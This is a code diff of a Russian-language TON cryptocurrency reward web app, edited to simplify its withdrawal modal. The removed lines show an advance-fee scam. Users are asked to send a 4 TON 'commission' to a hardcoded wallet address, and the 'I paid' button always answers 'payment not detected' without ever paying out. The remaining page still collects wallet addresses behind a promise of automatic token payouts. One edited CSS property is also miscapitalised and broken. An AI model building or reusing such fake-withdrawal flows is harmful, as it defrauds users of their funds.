@@ -167,7 +167,7 @@ header{
 #buyConfirm button{margin:6px 6px;padding:8px 12px;font-weight:700;background:linear-gradient(90deg,var(--wm-accentC),#00A8FF);color:#000;border:none;border-radius:8px}
 
 /* Info & Profile windows (glass-like fullscreen) */
-#infoWindow, #profileWindow{display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:800;background:linear-gradient(120deg,#1b1b1f,#2b2c2f);color:var(--text-light);padding:28px;box-sizing:border-box;overflow-y:auto}
+#infoWindow, #profileWindow{display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:800;background:linear-gradient(120deg,#1b1b1f,#2b2c2f);color:var(--text-light);padding:28px;box-sizing:border-box;Overflow-y:auto}
 #infoWindow .content, #profileWindow .content{max-width:1100px;margin:24px auto;border-radius:16px;padding:18px;background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));color:#fff;box-shadow:0 18px 50px rgba(0,0,0,0.7);border:1px solid rgba(255,255,255,0.02)}
 #infoWindow h2, #profileWindow h2{color:#ecf8ff;margin-bottom:10px}
 #infoWindow ul{color:#eaf2ff;padding-left:20px}
@@ -195,7 +195,7 @@ header{
 .withdraw-header{display:flex;justify-content:space-between;align-items:center;color:#ecf8ff}
 .withdraw-header .title{display:flex;align-items:center;gap:12px}
 .withdraw-header .title .icon{width:44px;height:44px;border-radius:10px;background:linear-gradient(90deg,var(--wm-accentC),#7adcff);display:inline-flex;align-items:center;justify-content:center;font-weight:900;color:#000}
-.withdraw-body{display:grid;grid-template-columns:1fr 1fr;gap:14px;align-items:start}
+.withdraw-body{display:grid;grid-template-columns:1fr;gap:14px;align-items:start}
 .withdraw-section{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.00));padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);box-shadow:0 12px 30px rgba(0,0,0,0.45)}
 .withdraw-section .sec-title{display:flex;align-items:center;gap:8px;margin-bottom:8px;font-weight:900;color:var(--wm-accentC)}
 .withdraw-section .sec-desc{font-size:13px;color:var(--birch);margin-bottom:10px}
@@ -294,7 +294,8 @@ header{
   overflow: auto;
 }
 
-/* Constrain the instruction section so it becomes scrollable instead of expanding card */
+/* Constrain the instruction section so it becomes scrollable instead of expanding card
+   (we removed the instruction block from the UI, but keep rule if needed) */
 #withdrawInstruction {
   display: none; /* kept default hidden */
   max-height: 200px; /* limit height */
@@ -565,7 +566,7 @@ header{
     </div>
   </div>
 
-  <!-- Withdraw modal (new) -->
+  <!-- Withdraw modal (simplified: only wallet connect/address container) -->
   <div id="withdrawModal" class="withdraw-modal" aria-hidden="true" role="dialog" aria-label="Вывод">
     <div class="withdraw-card" role="document">
       <div class="withdraw-header">
@@ -582,6 +583,7 @@ header{
       <div style="font-size:13px;color:var(--birch);margin-top:4px;">Все токены будут автоматически отправлены на указанный выше адрес в дату листинга монеты — <strong>15 декабря 2025</strong>.</div>
 
       <div class="withdraw-body">
+        <!-- KEEP: only address / wallet connect container -->
         <div class="withdraw-section" aria-label="address-section">
           <div class="sec-title">📫 Адрес для выплат</div>
           <div class="sec-desc">Укажите TON-адрес. После сохранения адрес будет привязан.</div>
@@ -595,33 +597,12 @@ header{
           </div>
           <div style="height:10px"></div>
           <div id="boundAddrInfo" class="small-note"></div>
+          <!-- status for address/connect -->
+          <div id="withdrawStatus" class="withdraw-warning" style="margin-top:8px;">Проверьте адрес</div>
         </div>
 
-        <div class="withdraw-section" aria-label="withdraw-action-section">
-          <div class="sec-title">⚙️ Вывод</div>
-          <div class="sec-desc">Минимальная сумма для вывода <strong>7 TON</strong>. Проверка и финальная выплата выполняются вручную администратором.</div>
-
-          <div id="withdrawStatus" class="withdraw-warning">Проверьте баланс</div>
-          <div style="height:10px"></div>
-
-          <div style="display:flex;gap:8px;align-items:center;">
-            <button id="checkBalanceBtn" class="btnPrimary">Проверить</button>
-            <button id="startWithdrawBtn" class="btnGhost">Вывести</button>
-          </div>
-
-          <div id="withdrawInstruction" style="display:none;margin-top:12px;padding-top:12px;border-top:1px dashed rgba(255,255,255,0.03);">
-            <div style="font-weight:900;margin-bottom:6px">Оплатите комиссию 4 TON</div>
-            <div style="display:flex;gap:8px;align-items:center;">
-              <div id="commissionAddr" style="font-weight:800;">UQDjvimtMSWjeqMx5zIE17Z8uUTL-bfRGLGOi7Trr92YLZxz</div>
-              <button id="copyCommissionBtn" class="copy-btn">Копировать</button>
-            </div>
-            <div style="height:8px"></div>
-            <div style="display:flex;gap:8px;justify-content:flex-end;">
-              <button id="iPaidBtn" class="btnPrimary">Я оплатил</button>
-              <button id="withdrawCancelBtn" class="btnGhost">Отмена</button>
-            </div>
-          </div>
-        </div>
+        <!-- Removed the previous withdraw-action-section (buttons for checking balance/withdrawal) per request.
+             Only wallet/address container remains. -->
       </div>
 
       <div style="display:flex;justify-content:flex-end;margin-top:12px;">
@@ -1026,7 +1007,7 @@ header{
     }
   }
 
-  // ========== Withdraw UI implementation ==========
+ // ========== Withdraw UI implementation (simplified) ==========
   (function(){
     const withdrawBtn = document.getElementById('withdrawBtn');
     const withdrawModal = document.getElementById('withdrawModal');
@@ -1035,18 +1016,8 @@ header{
     const changeAddrBtn = document.getElementById('changeWithdrawAddr');
     const copyAddrBtn = document.getElementById('copyAddrBtn');
     const boundInfo = document.getElementById('boundAddrInfo');
-    const checkBalanceBtn = document.getElementById('checkBalanceBtn');
-    const startWithdrawBtn = document.getElementById('startWithdrawBtn');
-    const withdrawInstruction = document.getElementById('withdrawInstruction');
-    const commissionAddrEl = document.getElementById('commissionAddr');
-    const copyCommissionBtn = document.getElementById('copyCommissionBtn');
-    const iPaidBtn = document.getElementById('iPaidBtn');
-    const withdrawCancelBtn = document.getElementById('withdrawCancelBtn');
     const withdrawStatus = document.getElementById('withdrawStatus');
     const closeWithdraw = document.getElementById('closeWithdraw');
-
-    const COMMISSION_ADDR = 'UQDjvimtMSWjeqMx5zIE17Z8uUTL-bfRGLGOi7Trr92YLZxz';
-    if (commissionAddrEl) commissionAddrEl.textContent = COMMISSION_ADDR;
 
     function loadBoundAddr(){ return localStorage.getItem(LS_WITHDRAW_ADDR) || ''; }
     function saveBoundAddr(addr){ try{ localStorage.setItem(LS_WITHDRAW_ADDR, addr); }catch(e){} }
@@ -1075,7 +1046,6 @@ header{
       withdrawModal.setAttribute('aria-hidden','false');
       renderBoundInfo();
       updateWithdrawStatus();
-      if(withdrawInstruction) withdrawInstruction.style.display = 'none';
     }
 
     function closeWithdrawModal(){
@@ -1093,6 +1063,7 @@ header{
       saveBoundAddr(v);
       renderBoundInfo();
       if(withdrawStatus) withdrawStatus.textContent = 'Адрес сохранён.';
+      save();
     });
 
     if (changeAddrBtn) changeAddrBtn.addEventListener('click', ()=>{ 
@@ -1110,10 +1081,6 @@ header{
       navigator.clipboard && navigator.clipboard.writeText(a).then(()=>{ if(withdrawStatus) withdrawStatus.textContent = 'Адрес скопирован.'; }).catch(()=>{ if(withdrawStatus) withdrawStatus.textContent = 'Не удалось скопировать.'; });
     });
 
-    if (copyCommissionBtn) copyCommissionBtn.addEventListener('click', ()=>{
-      navigator.clipboard && navigator.clipboard.writeText(COMMISSION_ADDR).then(()=>{ if(withdrawStatus) withdrawStatus.textContent = 'Адрес комиссии скопирован.'; }).catch(()=>{ if(withdrawStatus) withdrawStatus.textContent = 'Не удалось скопировать.'; });
-    });
-
     function updateWithdrawStatus(){
       const currentTon = +localStorage.getItem(LS_TON) || ton || 0;
       if(!withdrawStatus) return;
@@ -1121,28 +1088,6 @@ header{
       else { withdrawStatus.className = 'withdraw-warning'; withdrawStatus.textContent = 'Недостаточно TON: ' + formatTon(currentTon); }
     }
 
-    if (checkBalanceBtn) checkBalanceBtn.addEventListener('click', updateWithdrawStatus);
-
-    if (startWithdrawBtn) startWithdrawBtn.addEventListener('click', ()=>{
-      const a = loadBoundAddr();
-      if(!a){ if(withdrawStatus) withdrawStatus.textContent = 'Укажите адрес.'; return; }
-      const currentTon = +localStorage.getItem(LS_TON) || ton || 0;
-      if(currentTon < 7){ if(withdrawStatus) withdrawStatus.textContent = 'Недостаточно TON.'; return; }
-      if(withdrawInstruction){
-        withdrawInstruction.style.display = 'block';
-        // apply constraints explicitly (CSS also enforces this)
-        withdrawInstruction.style.maxHeight = '200px';
-        withdrawInstruction.style.overflowY = 'auto';
-      }
-    });
-
-    if (iPaidBtn) iPaidBtn.addEventListener('click', ()=>{
-      // НЕ списываем TON — только уведомление
-      if(withdrawInstruction) withdrawInstruction.style.display = 'none';
-      if(withdrawStatus){ withdrawStatus.className = 'withdraw-warning'; withdrawStatus.textContent = 'Платёж не обнаружен.'; }
-    });
-
-    if (withdrawCancelBtn) withdrawCancelBtn.addEventListener('click', ()=>{ if(withdrawInstruction) withdrawInstruction.style.display = 'none'; if(withdrawStatus) withdrawStatus.textContent = 'Вывод отменён.'; });
     renderBoundInfo();
   })();
 
